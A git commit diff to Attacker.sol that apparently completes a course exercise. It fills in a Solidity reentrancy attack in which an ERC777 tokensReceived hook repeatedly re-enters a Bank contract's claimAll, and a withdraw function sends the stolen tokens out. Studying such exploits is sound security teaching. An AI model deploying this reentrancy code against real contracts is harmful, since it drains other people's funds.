6f9c853f46f22d4a9a036f1afe6ad246ed22af16
EmmaZhang2017 <emmazhang2017@163.com>
2024-11-17 13:12:33 +0800

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -8,53 +8,43 @@ import "./Bank.sol";
 
 contract Attacker is AccessControl, IERC777Recipient {
     bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
-	IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); //This is the location of the EIP1820 registry
-	bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient"); //When someone tries to send an ERC777 contract, they check if the recipient implements this interface
+	IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); // This is the location of the EIP1820 registry
+	bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient"); // When someone tries to send an ERC777 contract, they check if the recipient implements this interface
 	uint8 depth = 0;
 	uint8 max_depth = 2;
 
-	Bank public bank; 
+	Bank public bank;
 
-	event Deposit(uint256 amount );
+	event Deposit(uint256 amount);
 	event Recurse(uint8 depth);
 
     constructor(address admin) {
         _grantRole(DEFAULT_ADMIN_ROLE, admin);
         _grantRole(ATTACKER_ROLE, admin);
-		_erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this)); //In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
+		_erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this)); // Register with the EIP1820 Registry to receive ERC777 tokens
     }
 
 	function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
 		bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
-        _grantRole(ATTACKER_ROLE, bank.token.address );
+        _grantRole(ATTACKER_ROLE, bank.token().address);
 	}
 
 	/*
 	   The main attack function that should start the reentrancy attack
 	   amt is the amt of ETH the attacker will deposit initially to start the attack
 	*/
-/*
 	function attack(uint256 amt) payable public {
-      require( address(bank) != address(0), "Target bank not set" );
-		//YOUR CODE TO START ATTACK GOES HERE
+        require(address(bank) != address(0), "Target bank not set");
+        require(msg.value == amt, "Incorrect ETH amount");
+
+        // Deposit ETH to the bank
+        bank.deposit{value: amt}();
+        emit Deposit(amt);
+
+        // Start the reentrancy attack by calling claimAll
+        bank.claimAll();
 	}
-*/
-
-function attack(uint256 amt) payable public {
-    require(address(bank) != address(0), "Target bank not set");
-    require(msg.value >= amt, "Insufficient ETH sent");
-    bank.deposit{value: amt}(); // Deposit ETH to the Bank contract
-    emit Deposit(amt);
-}
-
-
-
-
-
-
-
-
 
 	/*
 	   After the attack, this contract has a lot of (stolen) MCITR tokens
@@ -62,14 +52,12 @@ function attack(uint256 amt) payable public {
 	*/
 	function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
 		ERC777 token = bank.token();
-		token.send(recipient,token.balanceOf(address(this)),"");
+		token.send(recipient, token.balanceOf(address(this)), "");
 	}
 
 	/*
 	   This is the function that gets called when the Bank contract sends MCITR tokens
 	*/
-
-/*
 	function tokensReceived(
 		address operator,
 		address from,
@@ -78,26 +66,14 @@ function attack(uint256 amt) payable public {
 		bytes calldata userData,
 		bytes calldata operatorData
 	) external {
-		//YOUR CODE TO RECURSE GOES HERE
+        require(msg.sender == address(bank.token()), "Invalid token sender");
+        
+        // Continue reentrancy attack until max_depth is reached
+        if (depth < max_depth) {
+            depth++;
+            emit Recurse(depth);
+            bank.claimAll();  // Re-enter the bank's claimAll function
+        }
 	}
-*/
-
-
-function tokensReceived(
-    address operator,
-    address from,
-    address to,
-    uint256 amount,
-    bytes calldata userData,
-    bytes calldata operatorData
-) external override {
-    if (depth < max_depth) {
-        depth++;
-        emit Recurse(depth);
-        //bank.withdraw(); // Reenter the Bank contract to withdraw more funds
-	bank.tokensReceived( operator,  from,  to,  amount,  userData,  operatorData);
-    }
-}
-
 }
 
